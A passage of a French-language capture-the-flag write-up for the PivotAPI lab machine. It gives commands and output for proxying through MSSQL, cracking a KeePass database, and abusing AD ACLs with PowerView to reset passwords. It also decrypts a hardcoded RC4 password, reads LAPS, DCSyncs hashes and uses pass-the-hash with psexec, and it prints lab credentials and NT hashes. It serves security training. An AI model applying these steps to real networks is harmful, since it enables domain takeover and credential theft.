[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[*] Proxy mode: check
[*] Assembly is installed
[*] Procedure is installed
[*] reciclador is installed
[*] clr enabled
[*] Proxy mode: start
[*] Triggering Proxy Via MSSQL, waiting for ACK
[*] ACK from server!
[*] Listening on port 1337...
```

On configure proxychains (`/etc/proxychains.conf`) pour passer par le proxy SOCKS5 qu'on vient de setup :

```
[ProxyList]
socks5  127.0.0.1 1337
```

On peut maintenant se connecter en tant que svc_mssql sur le port WinRM et récupérer la database KeePass :

```bash
❯ proxychains4 -q evil-winrm -i PivotAPI.LicorDeBellota.htb -u svc_mssql -p '#mssql_s3rV1c3!2020'

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_mssql\Documents>
```

## Crack KeePass database

Après avoir testé du password reuse, on peut tenter de bruteforce le master password :

```bash
❯ keepass2john credentials.kdbx > keepass.hash
❯ john keepass.hash --wordlist=$(locate rockyou.txt)
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mahalkita        (credentials)
1g 0:00:00:00 DONE (2022-05-16 21:14) 4.166g/s 1066p/s 1066c/s 1066C/s alyssa..freedom
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

On ouvre la db :

![keepass_screen](https://i.imgur.com/8qfME3W.png)

On a des credentials pour se connecter en SSH sur le DC :

```
❯ sshpass -p 'Gu4nCh3C4NaRi0N!23' ssh 3v4Si0N@PivotAPI.LicorDeBellota.htb
```

## Exploit GenericAll in user object

Avec cette custom query neo4j : `MATCH p=shortestPath((c {owned: true})-[*1..5]->(s)) WHERE NOT c = s RETURN p`, on peut voir que :

![bh3](https://i.imgur.com/tnMcil6.png)

- L’utilisateur **3v4Si0N** a **GenericAll** sur l’utilisateur **DR.ZAIUSS**
- L’utilisateur **DR.ZAIUSS** a **GenericAll** sur l'utilisateur **SUPERFUME**
- L’utilisateur **SUPERFUME** est **membre** du groupe **DEVELOPERS**

Le groupe developers a l’air d’etre intéréssant. De plus, j’avais vu qu’il y avait un dossier `C:\Developers\` sur le DC auquelle je n’avais pas les permissions nécéssaires pour y accéder.

On importe le module [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) sur le DC en bypassant l’execution policy :

```powershell
❯ scp PowerView.ps1 3v4si0n@PivotAPI.LicorDeBellota.htb:/Users/3v4si0n/Desktop/PowerView.ps1

licordebellota\3v4si0n@PIVOTAPI C:\Users\3v4Si0N\Desktop>powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. Todos los derechos reservados.

PS C:\Users\3v4Si0N\Desktop> ipmo .\PowerView.ps1
```

On créer un objet PSCredential en tant que 3v4Si0N car on est connecté en SSH mais on est pas dans une PSSession :

```powershell
$SecPassword = ConvertTo-SecureString 'Gu4nCh3C4NaRi0N!23' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('LicorDeBellota\3v4Si0N', $SecPassword)
```

On change le password de l’utilisateur DR.ZAIUSS :

```powershell
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity DR.ZAIUSS -AccountPassword $UserPassword -Credential $cred
```

On créer un objet PSCredential pour impersonate l’utilisateur DR.ZAIUSS :

```powershell
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('LicorDeBellota\DR.ZAIUSS', $SecPassword)
```

On change le password de l’utilisateur SUPERFUME :

```powershell
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity SUPERFUME -AccountPassword $UserPassword -Credential $Cred
```

## SSH Local Port Forwarding / Create PSSession as SUPERFUME user

Pour récupérer un shell en tant que SUPERFUME, on peut créer une PSSession ou bien forward le port WinRM en local.

### Method 1 : SSH Local Port Forwarding

Récupérer un shell en forwardant le port WinRM et en se connectant avec [evil-winrm](https://github.com/Hackplayers/evil-winrm) :

```bash
❯ ssh -L 5985:localhost:5985 3v4Si0N@PivotAPI.LicorDeBellota.htb
❯ evil-winrm -i localhost -u 'SUPERFUME' -p 'Password123!'
```

### Method 2 : Create PSSession as SUPERFUME user

```powershell
PS C:\Users\3v4Si0N\Desktop> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
PS C:\Users\3v4Si0N\Desktop> $Cred = New-Object System.Management.Automation.PSCredential('LicorDeBellota\SUPERFUME', $UserPassword)
PS C:\Users\3v4Si0N\Desktop> $session = new-pssession -computername 127.0.0.1 -Credential $Cred
PS C:\Users\3v4Si0N\Desktop> Enter-PSSession -session $session
```

## C# Source code review

On peut maintenant accéder au répertoire `C:\Developers\` :

```powershell
[127.0.0.1]: PS C:\> ls -R C:\Developers

    Directorio: C:\Developers

Mode                LastWriteTime         Length Name

----                -------------         ------ ----

d-----       08/08/2020     19:26                Jari

d-----       08/08/2020     19:23                Superfume

    Directorio: C:\Developers\Jari

Mode                LastWriteTime         Length Name

----                -------------         ------ ----

-a----       08/08/2020     19:26           3676 program.cs

-a----       08/08/2020     19:18           7168 restart-mssql.exe
```

On a un exécutable qui permet d’après son nom de restart le service MSSQL avec son code source écrit en C# :

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Threading;

namespace restart_oracle
{
    class Program
    {
        public class RC4
        {

            public static byte[] Encrypt(byte[] pwd, byte[] data)
            {
                int a, i, j, k, tmp;
                int[] key, box;
                byte[] cipher;

                key = new int[256];
                box = new int[256];
                cipher = new byte[data.Length];

                for (i = 0; i < 256; i++)
                {
                    key[i] = pwd[i % pwd.Length];
                    box[i] = i;
                }
                for (j = i = 0; i < 256; i++)
                {
                    j = (j + box[i] + key[i]) % 256;
                    tmp = box[i];
                    box[i] = box[j];
                    box[j] = tmp;
                }
                for (a = j = i = 0; i < data.Length; i++)
                {
                    a++;
                    a %= 256;
                    j += box[a];
                    j %= 256;
                    tmp = box[a];
                    box[a] = box[j];
                    box[j] = tmp;
                    k = box[((box[a] + box[j]) % 256)];
                    cipher[i] = (byte)(data[i] ^ k);
                }
                return cipher;
            }

            public static byte[] Decrypt(byte[] pwd, byte[] data)
            {
                return Encrypt(pwd, data);
            }

            public static byte[] StringToByteArray(String hex)
            {
                int NumberChars = hex.Length;
                byte[] bytes = new byte[NumberChars / 2];
                for (int i = 0; i < NumberChars; i += 2)
                    bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
                return bytes;
            }

        }

        static void Main()
        {

            string banner = @"
                                                 by @HelpDesk 2020
";
            byte[] key = Encoding.ASCII.GetBytes("");
            byte[] password_cipher = { };
            byte[] resultado = RC4.Decrypt(key, password_cipher);
            Console.WriteLine(banner);
            Thread.Sleep(5000);
            System.Diagnostics.Process psi = new System.Diagnostics.Process();
            System.Security.SecureString ssPwd = new System.Security.SecureString();
            psi.StartInfo.FileName = "c:\\windows\\syswow64\\cmd.exe";
            psi.StartInfo.Arguments = "/c sc.exe stop SERVICENAME ; sc.exe start SERVICENAME";
            psi.StartInfo.RedirectStandardOutput = true;
            psi.StartInfo.UseShellExecute = false;
            psi.StartInfo.UserName = "Jari";
            string password = "";
            for (int x = 0; x < password.Length; x++)
            {
               ssPwd.AppendChar(password[x]);
            }
            psi.StartInfo.Password = ssPwd;
            psi.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            psi.Start();

        }
    }
}
```

Le programme stocke dans une variable le password chiffré de Jari, ainsi que la key RC4 permettant de le déchiffrer (ces éléments sont hardcodé dans le binaire, ils les ont simplement retiré du code source) :

```csharp
byte[] key = Encoding.ASCII.GetBytes("");
byte[] password_cipher = { };
byte[] resultado = RC4.Decrypt(key, password_cipher);
```

## Decompile .NET binary & Decrypt RC4 ciphertext password

Comme le PE utilise le framework dotnet, on peut décompiler le binaire avec [dnSpy](https://github.com/dnSpy/dnSpy) et retrouver le password de Jari chiffré avec la key :

```bash
❯ file restart-mssql.exe
restart-mssql.exe: PE32+ executable (console) x86-64 Mono/.Net assembly, for MS Windows
```

![retrieve_key_password](https://i.imgur.com/byZza3M.png)

Key RC4 : `CR_is_a_crybaby`

Password chiffré avec la key RC4 : `66 180 137 236 54 46 36 97 214 48 90 72 24 83`

On peut ensuite le déchiffrer sur [CyberChef](https://gchq.github.io/CyberChef/) :

![cyberchef_decrypt_cr4](https://i.imgur.com/zTqoNHx.png)
[Recipe CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Decimal('Space',false)RC4(%7B'option':'UTF8','string':'CR_is_a_crybaby'%7D,'Latin1','Latin1')&input=NjYgMTgwIDEzNyAyMzYgNTQgNDYgMzYgOTcgMjE0IDQ4IDkwIDcyIDI0IDgz)

On a un nouveau compte de domaine compromis : `jari:Cos@Chung@!RPG`

On peut PSRemote :

```bash
❯ evil-winrm -i localhost -u 'jari' -p 'Cos@Chung@!RPG'
```

## Exploit ForceChangePassword ACE & GenericAll on LAPS groups

On peut retourne sur BloodHound et marquer Jari en tant que owned. Cela tombe bien, c'est un utilisateur high value :

![bh4](https://i.imgur.com/5CPZWGu.png)

- L’utilisateur **JARI** a l'**ACE ForcheChangePassword** sur l’object user **GBIDEON**, on peut alors changer son password
- L’utilisateur **GIBDEON** est **membre** du groupe **Account Operators**
- Le groupe **Account Operators** a les droits **GenericAll** sur les **groupes LAPS READ** et **LAPS ADM**, gbideon est alors en capacité d’ajouter des membres aux groupes LAPS

Changement du password de gibdeon :

```powershell
$SecPassword = ConvertTo-SecureString 'Cos@Chung@!RPG' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('LicorDeBellota\jari', $SecPassword)

$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity gibdeon -AccountPassword $UserPassword -Credential $Cred
```

On ajoute gibdeon aux groupes LAPS :

```powershell
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('LicorDeBellota\gibdeon', $SecPassword)

Add-DomainGroupMember -Identity 'LAPS ADM' -Members 'gibdeon' -Credential $Cred
Add-DomainGroupMember -Identity 'LAPS READ' -Members 'gibdeon' -Credential $Cred
```

## Read LAPS password

On récupère le password de l’Administrateur local (dans l’attribut `ms-mcs-AdmPwd`) en utilisant [lapsdumper](https://github.com/n00py/LAPSDumper) :

```bash
❯ python3 laps.py -d LicorDeBellota.htb -u gibdeon -p 'Password123!' -l PivotAPI.LicorDeBellota.htb
PIVOTAPI$:QVXf458yVa6WwYKYwA3a
```

## DCSync

DCSync est une technique qui impersonate un DC en simulant un processus de réplication. L'outil [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) permet d'effectuer ce type d'attaque. Il envoie une requête [IDL_DRSGetNCChanges](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894) à la DRSUAPI pour répliquer les objets de l'annuaire LDAP dans un naming context (NC) donné, afin de récupérer des clés Kerberos ainsi que les secrets contenus dans la base `NTDIS.DIT`.

On peut maintenant récupérer les hashes NT de tous les comptes du domaine car on a les droits dcsync (`DS-Replication-Get-Changes` et `DS-Replication-Get-Changes-All`) :

```bash
❯ secretsdump.py PIVOTAPI$/Administrador:'QVXf458yVa6WwYKYwA3a'@PivotAPI.LicorDeBellota.htb
<...>
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrador:500:aad3b435b51404eeaad3b435b51404ee:0d8b667033c31225252e66198276e620:::
<...>
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrador:500:aad3b435b51404eeaad3b435b51404ee:392d2d96a5ec8969796d7450cf54af48:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3fc8c66f79c15020a2c2c7f1cffd8049:::
```

L'outil [psexec.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/psexec.py) de la suite [impacket](https://github.com/SecureAuthCorp/impacket) permet de déposer un service binary sur un share accéssible en écriture, créer et démarrer un service dans le gestionnaire de contrôle des services (SCM) via une connexion DCE/RPC sur le named pipe `\PIPE\svcctl`.

On peut finalement psexec avec le hash NT de l'Administrateur du domaine et récupèrer un shell en tant que nt authority\system :

```bash
❯ psexec.py LICORDEBELLOTA/Administrador@PivotAPI.LicorDeBellota.htb -hashes ':392d2d96a5ec8969796d7450cf54af48'
```
